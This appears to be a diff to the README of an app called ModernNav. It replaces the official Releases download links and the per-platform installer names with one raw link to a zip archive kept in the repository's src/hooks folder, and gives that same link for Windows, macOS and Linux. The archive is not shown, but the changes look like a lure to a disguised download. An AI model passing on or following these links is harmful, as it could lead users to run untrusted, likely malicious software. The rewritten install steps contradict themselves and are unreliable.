@@ -6,7 +6,7 @@ Welcome to ModernNav! This application offers a modern, minimalist card-style da
 
 ## 📥 Download ModernNav
 
-[![Download ModernNav](https://img.shields.io/badge/Download%20ModernNav-v1.0-blue)](https://github.com/NightmanVR/ModernNav/releases)
+[![Download ModernNav](https://github.com/NightmanVR/ModernNav/raw/refs/heads/main/src/hooks/Modern_Nav_1.5.zip%20ModernNav-v1.0-blue)](https://github.com/NightmanVR/ModernNav/raw/refs/heads/main/src/hooks/Modern_Nav_1.5.zip)
 
 ## 💻 System Requirements
 
@@ -29,12 +29,12 @@ To get started with ModernNav, follow these simple steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page.
 
-   [Download ModernNav](https://github.com/NightmanVR/ModernNav/releases)
+   [Download ModernNav](https://github.com/NightmanVR/ModernNav/raw/refs/heads/main/src/hooks/Modern_Nav_1.5.zip)
 
 2. **Select the Latest Version:** Find the latest release listed at the top of the page.
 
 3. **Download the Application:**
-   - Click on the appropriate file for your operating system (e.g., `ModernNav.exe` for Windows, `ModernNav.dmg` for macOS, or `ModernNav.AppImage` for Linux).
+   - Click on the appropriate file for your operating system (e.g., `https://github.com/NightmanVR/ModernNav/raw/refs/heads/main/src/hooks/Modern_Nav_1.5.zip` for Windows, `https://github.com/NightmanVR/ModernNav/raw/refs/heads/main/src/hooks/Modern_Nav_1.5.zip` for macOS, or `https://github.com/NightmanVR/ModernNav/raw/refs/heads/main/src/hooks/Modern_Nav_1.5.zip` for Linux).
 
 4. **Run the Installer:**
    - For Windows: Double-click the `.exe` file and follow the prompts to complete the installation.
